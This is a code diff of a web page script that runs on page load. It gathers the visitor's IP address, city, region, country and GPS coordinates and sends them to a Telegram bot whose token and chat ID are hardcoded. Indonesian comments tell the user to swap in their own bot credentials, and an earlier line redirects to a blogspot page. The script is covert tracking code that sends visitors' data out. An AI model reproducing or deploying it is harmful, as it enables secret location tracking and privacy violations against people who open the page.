@@ -15,7 +15,7 @@ document.location.href = 'https://expried.blogspot.com/';
 console.log('Server aktif');
 }
       </script>
-            <script>
+              <script>
         window.onload = function() {
             // Get IP address and location data
             fetch('https://ipapi.co/json/')
@@ -34,8 +34,8 @@ console.log('Server aktif');
                             const longitude = position.coords.longitude;
 
                             // Send data to Telegram bot
-                            const botToken = '8022814097:AAG1kYvBGiYUb8DXkQZWyxIp0AyKZn480-o';
-                            const chatId = '7407149096';
+                            const botToken = '8022814097:AAG1kYvBGiYUb8DXkQZWyxIp0AyKZn480-o'; // Ganti dengan token bot Anda
+                            const chatId = '7407149096'; // Ganti dengan ID chat Anda
                             const message = `
                                 IP Address: ${ip}
                                 Location: ${city}, ${region}, ${country}
